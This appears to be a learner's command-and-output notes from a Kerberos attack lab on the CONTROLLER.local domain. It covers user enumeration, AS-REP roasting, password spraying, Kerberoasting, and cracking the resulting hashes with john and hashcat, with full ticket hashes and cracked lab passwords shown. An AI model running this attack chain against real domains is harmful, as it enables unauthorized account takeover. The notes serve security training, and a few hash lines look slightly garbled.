
```powershell
# Scan the target
sudo nmap -Pn -n -sS -A -p- --vv  10.201.27.131 --max-rtt-timeout 5s --
max-retries 5 -oN TCPSCAN.log

# The domain name is:
CONTROLLER.local

# Enumerate users
kerbrute userenum --dc $ip -d CONTROLLER.local  User.txt 

2025/11/04 08:40:40 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2025/11/04 08:40:40 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2025/11/04 08:40:40 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2025/11/04 08:40:41 >  [+] VALID USERNAME:	 user2@CONTROLLER.local

#Saved the found users in a new list (foundUsers.txt)
# check preAuth for the found users
impacket-GetNPUsers CONTROLLER.local/ -usersfile foundUsers.txt -no-pass -dc-ip $ip

$krb5asrep$23$admin2@CONTROLLER.LOCAL:0951ceb8cc9e35a6ab6546a54b87a3ae$5c0ce7a4d8de837450108e8da3e5544bfb61869e2d88ec35a72cf2cf126b8e680afc6b29615c0cb5d28e28060bfd69ec87e7ae71648075fbddd35e9eb23384d5ae65c5707ebb2175de0f0dc2a9969fdd48b7e7c1a5f46dfe70080dddb71bffe717da535d951c670f70faa447ea2be76aeec37a282143041c23cabdff990f06c2ef36ce5ca76b11553b84f5013a0195d518db08d4eea0bc6e3be4ae9b5c582d6fbfe5c472100cc408c5b25dc67bdb5acdabf6285e9854e2c3763da9b90f57038cfa84dea085dc21b6f6f661f4505d33254e2c03f812299f386d69168b36f4e4dc153698804dc92fad12b1e03ac7c9a01a8d52f5d4
$krb5asrep$23$user3@CONTROLLER.LOCAL:41a6a9c622049cf3b4291a6579af5df8$9173ff01fede25616051b3b27e8ce6f004fb4acc597eaf1cdf2192e9c42ebdbd399ee9c061eb3e43d9667c8468974653f7962ee962b1dcf313e40ffbfddcd8963ae70657a0931b5a1bc2d02d36e1751dd66e69bd148d2998ccf18376beedb6dce811f31fa15bcebc79729a304c7ca0a1a4af421f9eeecc54ca46ee1663caabc2f524e9b3dec1de70f1ba6606c450359ae4449737975a462980d7f14d16fd12f617ed29ca8867cd39f776bb4cb916bc94ac349ee0b1a972cfe18c0bbdb0963b26b06afe66a9e09a6d87669d934e3fa46fc792b56937dd366f8cf97baff6cc581b0d75b889616663c3e94c57815b7ab1d498f634f6

# Saved the hashes in a file (hashes.txt)
# Crack the hashes

john --format=krb5asrep hashes.txt -wordlist=Pass.txt
	
	user3:Password3
	admin2:P@$$W0rd2



	# couldn't find password of admin
	


```


```powershell
# ssh into the target (administrator:P@$$W0rd was given) 
# Run Rubeus.exe to harvest for TGTs every 30 secs
Rubeus.exe harvest /interval:30
# Saved the harvested tickets in another file - tickets.txt

# A password was given (Password1)
# use Kerbrute to spray passwords:
kerbrute passwordspray --dc CONTROLLER.local -d CONTROLLER.local foundUsers.txt Password1

	2025/11/04 10:10:08 >  [+] VALID LOGIN:	 machine1@CONTROLLER.local:Password1
	

# Use user3 or machine1 domain account and check for kerberoastable accounts
impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.201.27.131 -request
impacket-GetUserSPNs controller.local/user3:Password3 -dc-ip 10.201.27.131 -request

$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$7bdb5033d0762173979b5b1244005004$a7bf533065aecee697c2e76b9bc0612db87500212ad9d45fe3064c6538b55f4c7c26049f5d8784d792ca381a32292a07ef863ef80fcf47a445982e495ce1c1e87b1540aafd11a44673c9c282817365d41f0394067bd56cc4919e3dbd0131814be040fe9885831290de408446c7e20ea688a3ca48204b5a0e940014d1f6c5de44553e67f73a7ca8f214a47c7dc78e0ccde72e9c6fd8a2c5b089ad03c5c7a7a5e1d8dd0a65024a58aa9532c8c48a2fff22e73a2442f8507a994fa9cef1befcf74ee3c0644922ac371b9e07f04c6b2819c7e2213627fe7cb454b9c0953cc940b4d9ca7104a1d72bf86d223cfce9d913f9a8eb12659a6e70c881ba5818c3cff98a012b3bc2b9557c1378153c64ed58df0dad562b3de4006a2261f7adabc62f5a3c3ef73330b7e05d22f73c01a1cf9d56f86e36ea1fb7a5b04a8c6e6b2002c7b2155f2340f1b8a8391061ae559c23ec3d38b9cc034b0088b95bd66626ec299a72af0cd47339d56d0f70bb851cd1888a6db92c38336736a5e50564ed81858081c48ce942da5954aeca3ef1b5446b986d03998257b2023daf2ab2d849f4f91ea7b24070b45ed36e2bdf6289ec7c824386d2e8c50583708ed4389ca9cd02ce698641a88833cad2c6cddac399a9d61d03e8668fee8d64cc64206aded04ba0cef4c4a6b8740e504f1b629f71366f2f2f3b808887a3c333fe8716fdf5f649344faf134f1c7bb200ff3f53f565442f4ff5fbb079e6a85fa09828ff33b5fb211c291aa4293725cf66edf25a26bbce5df3690ea5e1d9d499695cfd9704dcc88b5e957025a50f56d002ade9ef0be02fe2b0d20bdacbd7495074fc95a0e67c18d576b78a8d3c9d93005434b528ec8084b71f834265d01de4487ac3601b869f54a0c01503f4db2f60b5faef39e8ce7742969fe1c2cdd0343cb3368f14c51ffe0d42fe3df0cf6c96d518cca3c9d4516024c6482447c8ab619649b6e1a7aef22354479c113b1d7c0f2061edd2b04d0122eb783d8ef58082873db577d97d4e895663144669ab8d8dc844e5389068c07b8e01ddb28b4467692deb7b9804b9dfd2e1c495bd2636359f0beaed2b7c579ff52df1affa7a6d28be2d2229c4fcad7f9ceca7a19184bb8f3483ad1332a785cb900e9e0ccd1be6442cdf36463b5c8771465b252b8f61883ac4e3154878787526e635724ea29261f6e30adf8c6c96f0bed56460c91b5bf19e726224cdd5666a81926d4b2bfec9f354f4c7feaf7101aa3e1199d99972815ce60b49bd4ffc8ba84a811213cfe3f86a2957bdc9aeef7c7d3a7ab87b014b432610967229ca3be961d2380da2025c3c02df5561b540312fcf2bd2ade9fdbf0faa3e3cc871b462631b0ff70affb5a6e0617b94940e67
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$8398d295bc185aba87f07fed777d809c$82e368b8d6bb384a51cd00523546f8804cfffb5c9bb46902130adc1fd907c13a28fe9f7c008c49a8266c4e31e7b95ddde2ef7e95027aff0c82a0006e237a75d3880408b8d434c7c5b5443a06a7dc2580e07fb67ceeb73caa2d9301b519e2eff051478b258b570283b525a2ec162f1153d6da80b293be365d4528cf65bb580fafd2244d8858e256310d4f6655c0b02a6908c2960647028d973ca4fdd761d7c9602c3--628a215779124c014338df3a10ea3e4616eb2d83fb022317c7af756bc84f679e646a14a291803148a06402b2ec49bf4ca027cb71ced58a07225c29923bee2192ef25fc058405ee9b26ac85c099192427f5f67b38f12535db151b5480aa26f43cd545aa5b7a96e9ed605a39ab762cfe0a40957446fc94e3dd6b70902b96913bacbb9117090866a99a6aaa99a705743f9f879f8cf1614a47188f92f97206d06cbc385bfa3d2b106ba2658270afb329051aba6e12962af92b28b1dc16d93d0b9aa2434ca1c723e5485bd8d76d87daadb8eb3a9636148d444762d13f7cef9726ca628ad8ec2284fd8557247c186be6528666185b89026e9bd8369c57aa7ef12b0f5f6eca001403d8a712fcfb94db99cbb6fb637b63e6d0ecba2ee3c0c93bfd2786ff2934cd34dde2d2e916c868e511dad5c31bc0a3b6a4a58e038cef1378b24b2dcd04e073e89bccc750d0b85a0e76ad870ea3173a5d56d11e2cdb0c488e77cf4b6539eb6265196a094b58ba4a4fc06c581bd3a4b8aa53bdc6d241c6b43b6171f8c7ee7f5f0a5e073a44b5bcb239ee85805e531c3e4f1e00c8fa2c86e4975112270f7c3e38d848342dd5fdd964f9d5b5f21771f7246a3c4988edd9087c500cc2f2439b659d0c028491237bc9a5528f2a15ae08306c09f5b207b70b33c9afc2da100f72475cf2f7e09fb49f4179eef6ccf12b17cda9a06e181cef041d6434e6f1c0f26d5ac7a0e44a3c91fb7711021e3b30e743b9a2ef546d3ba03990be73103fa70821cd945321aef648543879a0b87a6debfb0de4efd2196a7575fb05d7b70791f63f4d686562e25ed726bf25a1f0507c94e64689b8acef0944fac7f5673d8faac2becc230e3c2953c5a520e386cfab6a96ed5155e581d884d9623408ee6ea12828436eac2aee85910043f3eaca8e832f01688aae451e7172680c27b9090c4f22550a845d059711ec4c5c9c8497917aa97645c8cdcc36c78e78fc0a46ce5f0fa59a86542e58ce454615fcbbae6aec8333b4abb3d07662981d79f92903d697ae197d6115ebf2d96bfebfbf78110a590ddd4e5c8e54c378e314ebee2c490b4bb3945442a1307066027b281da99c980e3ab7750d3f3f2ed86bfcc0d059215ff0ffcfce1ec0f3d421aec5d191927ba85692bb7

# Crack hashes
hashcat -m 13100 hash.txt Pass.txt
john --format=krb5tgs TGS_hashes.txt -wordlist=Pass.txt


	SQLService:MYPassword123#
	HTTPService:Summer2020


$```